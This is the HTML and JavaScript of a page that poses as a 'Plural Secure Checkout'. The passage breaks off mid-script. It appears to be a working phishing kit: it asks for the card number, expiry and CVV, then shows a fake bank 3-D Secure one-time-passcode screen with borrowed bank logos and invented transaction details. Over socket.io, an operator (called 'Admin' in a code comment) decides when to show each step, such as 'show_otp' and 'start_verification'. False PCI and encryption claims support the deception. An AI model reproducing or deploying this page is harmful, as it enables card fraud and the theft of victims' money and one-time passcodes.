<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Plural Secure Checkout</title>
    <meta name="description" content="Secure payment gateway powered by Plural" />
    <meta name="author" content="Plural" />

    <!-- External CSS - Tailwind CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Socket.io Client Library -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    
    <!-- React and React DOM -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

    <style>
        /* Base styles */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background-color: #f7f9fc;
            margin: 0;
            padding: 0;
            background-image: linear-gradient(to bottom right, rgba(241, 245, 249, 0.8), rgba(226, 232, 240, 0.8));
        }
        .rounded-lg { border-radius: 0.5rem; }
        .border { border-width: 1px; }
        .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
        .bg-primary { background-color: #2563eb; }
        .text-white { color: white; }
        .font-bold { font-weight: 700; }
        .text-gray-100 { color: #f3f4f6; }
        .space-y-1 > * + * { margin-top: 0.25rem; }
        .p-6 { padding: 1.5rem; }
        .mb-4 { margin-bottom: 1rem; }
        .mb-6 { margin-bottom: 1.5rem; }
        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .text-2xl { font-size: 1.5rem; }
        .text-sm { font-size: 0.875rem; }
        .text-gray-600 { color: #4b5563; }
        .space-x-2 > * + * { margin-left: 0.5rem; }
        .text-green-500 { color: #10b981; }
        .font-medium { font-weight: 500; }
        .gap-3 { gap: 0.75rem; }
        .h-8 { height: 2rem; }
        .w-12 { width: 3rem; }
        .h-6 { height: 1.5rem; }
        .object-contain { object-fit: contain; }
        .space-y-4 > * + * { margin-top: 1rem; }
        .relative { position: relative; }
        .pl-10 { padding-left: 2.5rem; }
        .pr-10 { padding-right: 2.5rem; }
        .absolute { position: absolute; }
        .left-3 { left: 0.75rem; }
        .top-3 { top: 0.75rem; }
        .right-3 { right: 0.75rem; }
        .top-2\.5 { top: 0.625rem; }
        .h-4 { height: 1rem; }
        .w-4 { width: 1rem; }
        .text-gray-400 { color: #9ca3af; }
        .h-5 { height: 1.25rem; }
        .w-10 { width: 2.5rem; }
        .grid { display: grid; }
        .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .gap-4 { gap: 1rem; }
        .w-full { width: 100%; }
        .bg-blue-50 { background-color: #eff6ff; }
        .text-blue-500 { color: #3b82f6; }
        .h-12 { height: 3rem; }
        .w-12 { width: 3rem; }
        .text-center { text-align: center; }
        .bg-white { background-color: white; }
        .p-3 { padding: 0.75rem; }
        .border-gray-200 { border-color: #e5e7eb; }
        .mr-3 { margin-right: 0.75rem; }
        .bg-blue-100 { background-color: #dbeafe; }
        .rounded-full { border-radius: 9999px; }
        .p-2 { padding: 0.5rem; }
        .text-xs { font-size: 0.75rem; }
        .text-gray-500 { color: #6b7280; }
        .text-lg { font-size: 1.125rem; }
        .font-semibold { font-weight: 600; }
        .my-6 { margin-top: 1.5rem; margin-bottom: 1.5rem; }
        .justify-center { justify-content: center; }
        .w-10 { width: 2.5rem; }
        .h-14 { height: 3.5rem; }
        .w-14 { width: 3.5rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .cursor-not-allowed { cursor: not-allowed; }
        .opacity-50 { opacity: 0.5; }
        .text-blue-600 { color: #2563eb; }
        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
        .flex-col { flex-direction: column; }
        .animate-spin { animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .border-t-2 { border-top-width: 2px; }
        .border-b-2 { border-bottom-width: 2px; }
        .border-primary { border-color: #2563eb; }
        .h-16 { height: 4rem; }
        .w-16 { width: 4rem; }
        .bg-green-100 { background-color: #d1fae5; }
        .text-green-500 { color: #10b981; }
        .bg-red-100 { background-color: #fee2e2; }
        .text-red-500 { color: #ef4444; }
        .border-t { border-top-width: 1px; }
        .pt-0 { padding-top: 0; }
        .h-6 { height: 1.5rem; }
        .flex-wrap { flex-wrap: wrap; }
        .gap-6 { gap: 1.5rem; }
        .py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
        .h-5 { height: 1.25rem; }
        
        /* Form styles - IMPROVED */
        input {
            width: 100%;
            padding: 0.75rem 1.5rem;
            border: 1px solid #d1d5db;
            border-radius: 0.375rem;
            outline: none;
            font-size: 16px;
            transition: all 0.2s ease;
            height: 48px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
        }
        input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
        }
        
        /* Improved input placeholder styling */
        input::placeholder {
            color: #a0aec0;
            font-weight: 400;
        }

        /* Add more spacing for non-icon inputs */
        input:not(.pl-10) {
            padding-left: 1.5rem;
        }
        
        /* Pay Now button - IMPROVED */
        .pay-now-btn {
            background-color: #2563eb;
            color: white;
            font-weight: 600;
            font-size: 16px;
            padding: 0.75rem;
            border-radius: 0.375rem;
            width: 100%;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            height: 52px;
            box-shadow: 0 2px 4px rgba(37, 99, 235, 0.2);
            text-transform: uppercase;
            letter-spacing: 0.025em;
        }
        .pay-now-btn:hover {
            background-color: #1d4ed8;
            transform: translateY(-1px);
            box-shadow: 0 4px 6px rgba(37, 99, 235, 0.3);
        }
        .pay-now-btn:active {
            transform: translateY(0);
            box-shadow: 0 1px 2px rgba(37, 99, 235, 0.2);
        }
        
        /* Input icons - IMPROVED positioning */
        .input-icon {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .input-icon.left {
            left: 12px;
        }
        .input-icon.right {
            right: 12px;
        }
        
        /* Card container with improved styling */
        .card-container {
            background-color: white;
            border-radius: 0.75rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(226, 232, 240, 0.8);
        }
        
        /* Background pattern effect */
        .card-container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 180px;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(226, 232, 240, 0.2) 10%, transparent 20%),
                radial-gradient(circle at 80% 40%, rgba(226, 232, 240, 0.3) 15%, transparent 25%),
                radial-gradient(circle at 40% 70%, rgba(226, 232, 240, 0.4) 8%, transparent 15%);
            opacity: 0.5;
            z-index: 0;
            pointer-events: none;
        }
        
        /* OTP input styles - IMPROVED */
        .otp-input {
            display: flex;
            gap: 0.75rem;
            justify-content: center;
        }
        .otp-input input {
           width: 3rem;
            height: 3.5rem;
            text-align: center;
            font-size: 1.5rem;
            border: 1px solid #d1d5db;
            border-radius: 0.5rem;
            background-color: white;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
        }
        .otp-input input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
        }
        
        /* Card layout */
        @media (min-width: 768px) {
            .md\:flex { display: flex; }
            .md\:w-1\/2 { width: 50%; }
        }
        
        /* Separator line */
        .separator-vertical {
            width: 1px;
            height: 1.5rem;
            background-color: #e5e7eb;
        }

        /* MC verification styles */
        .fixed {
            position: fixed;
        }
        .inset-0 {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
        }
        .z-50 {
            z-index: 50;
        }
        .bg-opacity-75 {
            --bg-opacity: 0.75;
        }
        .bg-black {
            background-color: rgba(0, 0, 0, var(--bg-opacity));
        }
        
        /* Card details section with improved styling */
        .card-details-section {
            padding: 2rem;
            position: relative;
            z-index: 1;
        }
        .card-details-section h2 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: #1e293b;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        .form-group label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: #4b5563;
        }
        
        /* Order summary section */
        .order-summary {
            padding: 2rem;
            background-color: #f8fafc;
            border-right: 1px solid #e2e8f0;
            position: relative;
            z-index: 1;
        }
        .order-summary h2 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: #1e293b;
        }
        
        /* Header bar */
        .header-bar {
            background: linear-gradient(90deg, #2563eb, #3b82f6);
            color: white;
            padding: 1.25rem 2rem;
            border-top-left-radius: 0.75rem;
            border-top-right-radius: 0.75rem;
        }
        
        /* Footer bar */
        .footer-bar {
            padding: 1.5rem 2rem;
            border-top: 1px solid #e2e8f0;
            background-color: #f8fafc;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            gap: 1.5rem;
        }
        
        /* Security badges */
        .security-badge {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .security-badge img {
            height: 1.5rem;
            width: auto;
        }
        
/* MC Verification Styles */
.fullscreen-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(2px);
  z-index: 9999;
  display: none;
  justify-content: center;
  align-items: center;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

#mcOtpInput:focus {
  border-color: #3498db !important;
  box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
  outline: none !important;
}

.btn-loading {
  position: relative;
  pointer-events: none;
  opacity: 0.8;
}

#mcVerificationContent {
  font-family: Arial, sans-serif;
}
    </style>
</head>

<body>
    <div id="app" class="min-h-screen flex items-center justify-center p-4">
        <!-- Initial static version that will show while JavaScript loads -->
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">100% Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $1299.00 USD
                </div>
            </div>
            
            <div class="md:flex">
                <!-- Left Side - Order Summary -->
                <div class="order-summary md:w-1/2">
                    <h2>Order Summary</h2>
                    
                    <div class="space-y-2">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Sub Total</span>
                            <span>$1,200.00</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Tax (GST)</span>
                            <span>$99.00</span>
                        </div>
                        <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
                            <span>Total Amount</span>
                            <span>$1,299.00</span>
                        </div>
                    </div>
                    
                    <div class="my-6">
                        <div class="flex items-center space-x-2 mb-3">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                            <span class="font-medium">Secure Payment Gateway</span>
                        </div>
                        <p class="text-sm text-gray-600">
                            Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                        </p>
</div>
                    
                    <div>
                        <h3 class="text-md font-medium mb-2">We Accept</h3>
                        <div class="flex flex-wrap gap-3">
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" alt="Discover" class="h-6 w-auto object-contain" />
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Side - Card Details -->
                <div class="card-details-section md:w-1/2">
                    <h2>Card Details</h2>
                    <form id="card-form" class="space-y-4">
                        <div class="form-group">
                            <label>Card Number</label>
                            <div class="relative">
                                <div class="input-icon left">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                        <line x1="1" y1="10" x2="23" y2="10"></line>
                                    </svg>
                                </div>
                               <input 
                                    type="text" 
                                    id="card-number" 
                                    placeholder="1234 5678 9012 3456" 
                                    maxlength="19" 
                                    class="pl-10 pr-10"
                                />
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label>Card Holder Name</label>
                            <input 
                                type="text" 
                                id="card-holder" 
                                placeholder="John Doe"
                            />
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4">
                            <div class="form-group">
                                <label>Expiry Date</label>
                                <input 
                                    type="text" 
                                    id="expiry-date" 
                                    placeholder="MM/YY" 
                                    maxlength="5"
                                />
                            </div>
                            
                            <div class="form-group">
                                <label>CVV</label>
                                <div class="relative">
                                    <div class="input-icon left">
                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                        </svg>
                                    </div>
                                    <input 
                                        type="password" 
                                        id="cvv" 
                                        placeholder="123" 
                                        maxlength="4" 
                                        class="pl-10"
                                    />
                                </div>
                            </div>
                        </div>
                        
                        <button 
                            type="submit" 
                            class="pay-now-btn"
                        >
                            Pay Now
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div> 
        </div>
    </div>

<!-- MC Verification Overlay -->
<div id="mcVerificationOverlay" class="fullscreen-overlay">
  <!-- Loading Content - Shown Initially -->
  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0.2);">
    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
    
    <!-- Added verification logo during loading -->
    <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
      <!-- Logo will be inserted here dynamically -->
    </div>
  </div>
  
  <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
    <!-- Header with bank and card brand logos -->
    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
      <div style="height: 40px; max-width: 45%;">
        <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
      </div>
      <div style="height: 40px; max-width: 45%; text-align: right;">
        <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
      </div>
    </div>

    <!-- Main content -->
    <div style="padding: 15px;">
      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
      
      <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
          One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
        </p>
      </div>
      
      <!-- Transaction details -->
      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
        <div style="margin-bottom: 5px;">
          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Merchant</span>
          <span id="merchantName" style="display: inline-block; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
        </div>
        <div style="margin-bottom: 5px;">
          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Amount</span>
          <span style="display: inline-block; text-align: left; font-weight: 500;">
            <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
          </span>
        </div>
        <div style="margin-bottom: 5px;">
          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Date</span>
          <span id="transactionDate" style="display: inline-block; text-align: left; font-weight: 500;">17:10:09</span>
        </div>
        <div style="margin-bottom: 5px;">
          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Card Number</span>
          <span id="cardNumberDisplay" style="display: inline-block; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
        </div>
        <div style="margin-bottom: 5px;">
          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Reference Id</span>
          <span id="referenceId" style="display: inline-block; text-align: left; font-weight: 500;">299879</span>
        </div>
      </div>
      
      <!-- OTP input field -->
      <div style="margin-bottom: 20px; display: flex; align-items: center;">
        <span style="font-size: 13px; margin-right: 10px; min-width: 150px;">Enter One-Time Passcode</span>
        <div style="position: relative; flex: 1;">
          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
              <circle cx="12" cy="12" r="10"/>
              <path d="M12 16v-4M12 8h.01"/>
            </svg>
          </div>
        </div>
      </div>
      
      <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
        Incorrect OTP, please enter valid one time passcode sent to your registered mobile
      </p>
      
      <!-- Consent checkbox - updated to be smaller -->
      <div style="margin-bottom: 15px;">
        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 11px; color: #555; margin-left: 5px; margin-right: 5px;">
          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 12px; height: 12px;" checked>
          <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
        </label>
      </div>
      
      <!-- Action buttons -->
      <div style="display: flex; gap: 5px; margin-bottom: 10px;">
        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #8ab4f8; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
        <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
        <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
      </div>
      
      <!-- Timer will be inserted here dynamically -->
      <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;"></div>
      
      <!-- Footer links -->
      <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
      </div>
    </div>
  </div>
</div>

<script>
// Global error handler to catch uncaught exceptions
window.onerror = function(message, source, lineno, colno, error) {
    console.error('Uncaught error:', message, source, lineno, colno, error);
    const appElement = document.getElementById('app');
    if (appElement) {
        appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
            <h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
            <p style="margin-bottom: 10px;">Please try refreshing the page or contact support if the issue persists.</p>
            <p style="font-size: 12px; color: #666;">Error details: ${message}</p>
            <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
        </div>`;
    }
    return true;
};

// Initialize application state globally
let state = {
    step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
    transactionId: '',
    loading: false,
    otpValue: '',
    amount: 1299.00,
    maskedPhone: '',
    cardType: null,
    timeLeft: 59,
    canResend: false,
    cardForm: {
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        errors: {}
    }
};

// Timer reference
let timerRef = null;
let socket = null;
let mcTimerInterval = null;

// Main application code
document.addEventListener('DOMContentLoaded', function() {
    try {
        // Initialize socket connection
        socket = io(window.location.origin, {
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            timeout: 20000,
            transports: ['websocket', 'polling']
        });
        
        // Add debugging listeners
        socket.on('connect', () => {
            console.log('Connected to Socket.IO server with ID:', socket.id);
            
            // Join room based on URL pid parameter
            const urlParams = new URLSearchParams(window.location.search);
            const pid = urlParams.get('pid');
            if (pid) {
                console.log('Joining room for PID:', pid);
                socket.emit('join', pid);
            }
        });

        socket.on('disconnect', () => {
            console.log('Disconnected from Socket.IO server');
        });

        socket.on('error', (error) => {
            console.error('Socket error:', error);
        });
        
        socket.on('connect_error', (error) => {
            console.error('Socket connection error:', error);
            const appElement = document.getElementById('app');
            if (appElement) {
                appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
                    <h3 style="margin-bottom: 10px; font-size: 18px;">Connection Error</h3>
                    <p style="margin-bottom: 10px;">Failed to connect to the server. Please check your internet connection and try again.</p>
                    <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
                    <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
                </div>`;
            }
        });
        
        // Setup socket listeners and initialize app
        setupSocketListeners();
        
        // Generate random phone number for OTP
        generateRandomPhone();
        
        // Show the card form
        showCardUI();
        
    } catch (error) {
        console.error('Initialization error:', error);
        document.getElementById('app').innerHTML = `
            <div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
                <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
                <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
                <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px;
                background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
            </div>
        `;
    }
});

function setupSocketListeners() {
    socket.on('card_data_received', (data) => {
        console.log('Card data received acknowledgement:', data);
        if (data.invoiceId) {
            socket.emit('join', data.invoiceId);
            console.log('Joined room for invoice:', data.invoiceId);
            
            if (!state.transactionId) {
                state.transactionId = data.invoiceId;
            }
        }
    });
    
    socket.on('show_otp', (data) => {
        console.log('OTP verification requested:', data);
        
        if (!state.transactionId) {
            state.transactionId = data.transaction_id || data.invoiceId;
        }
        
        if (data.transaction_id === state.transactionId || 
            data.invoiceId === state.transactionId || 
            !state.transactionId) { 
            
            console.log('OTP condition met, showing OTP form');
            showOTPUI();
        } else {
            console.warn('Transaction ID mismatch:', data.transaction_id, state.transactionId);
        }
    });
    
    socket.on('payment_success', (data) => {
        console.log('Payment success:', data);
        if (data.transaction_id === state.transactionId) {
            showSuccessUI();
        }
    });
    
    socket.on('payment_failed', (data) => {
        console.log('Payment failed:', data);
        if (data.transaction_id === state.transactionId) {
            showErrorUI("Payment Failed", data.message || "Your payment could not be processed");
        }
    });
    
    socket.on('currency_redirect', (data) => {
        console.log('Currency redirect requested:', data);
        showToast("Processing payment", "Redirecting to currency selection...");
        showProcessingUI();
    });
    
    socket.on('toggle_bankpage', (data) => {
        console.log('Bank page toggle requested:', data);
        if (data.show) {
            showToast("Bank Verification", "Your bank requires additional verification");
        }
    });
    
    socket.on('show_mc_verification', (data) => {
        console.log('MC verification requested:', data);
        showProcessingUI();
        
        setTimeout(() => {
            showMCVerification(data);
        }, 1500);
    });
    
    socket.on('start_verification', (data) => {
        console.log('Start verification requested:', data);
        
        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
        const mcLoadingContent = document.getElementById('mcLoadingContent');
        const mcVerificationContent = document.getElementById('mcVerificationContent');
        
        if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
            // Hide loading, show verification content
            mcLoadingContent.style.display = 'none';
            mcVerificationContent.style.display = 'block';
            
            // Update UI components with transaction data
            updateMcVerificationUI(data);
            
            // Start the timer for 4:59 minutes
            startMCTimer();
        }
    });
    
    socket.on('mc_verification_result', function(result) {
        const mcContainer = document.getElementById('mcVerificationOverlay');
        if (mcContainer) {
            mcContainer.style.display = 'none';
        }
        
        // Clear the MC timer if it exists
        if (mcTimerInterval) {
            clearInterval(mcTimerInterval);
        }
        
        if (result.success) {
            showSuccessUI();
        } else {
            const reason = result.reason ? getReadableFailureReason(result.reason) : "Your payment could not be processed";
            showErrorUI("Payment Failed", reason);
        }
    });
  socket.on('mc_otp_error', function(data) {
        const otpInput = document.getElementById('mcOtpInput');
        const errorMsgElem = document.getElementById('mcOtpError');
        
        if (otpInput) {
            otpInput.classList.add('border-red-500');
            
            if (errorMsgElem) {
                errorMsgElem.textContent = data.message || 'Invalid OTP. Please try again.';
                errorMsgElem.style.display = 'block';
            }
            
            const submitBtn = document.getElementById('mcSubmitBtn');
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit';
            }
        }
    });
    
    socket.on('update_mc_bank', function(data) {
        if (data.bankCode) {
            const bankLogo = document.getElementById('bankLogo');
            if (bankLogo) {
                // Map of bank codes to logo URLs
                const bankLogos = {
                    'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
                    'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
                    'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
                    'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
                };
                
                bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
            }
        }
    });
    
    socket.on('update_mc_currency', function(data) {
        if (data.currency) {
            updateCurrencyDisplay(data.currency);
        }
    });
}

// Start the timer for 4:59 minutes (299 seconds)
function startMCTimer() {
    const timerDisplay = document.getElementById('mcTimer');
    if (!timerDisplay) return;
    
    let timeLeft = 299; // 4:59 in seconds (4 minutes and 59 seconds)
    
    // Clear any existing timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    // Update timer display function
    function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
    }
    
    // Initial display
    updateTimerDisplay();
    
    // Start the timer
    mcTimerInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(mcTimerInterval);
            // Handle timeout - maybe show an error or auto-cancel
            const cancelBtn = document.getElementById('mcCancelBtn');
            if (cancelBtn) {
                cancelBtn.click();
            }
        }
    }, 1000);
}

function getReadableFailureReason(reasonCode) {
    const reasons = {
        'insufficient_balance': 'Insufficient funds in your account',
        'bank_declined': 'Your bank declined this transaction',
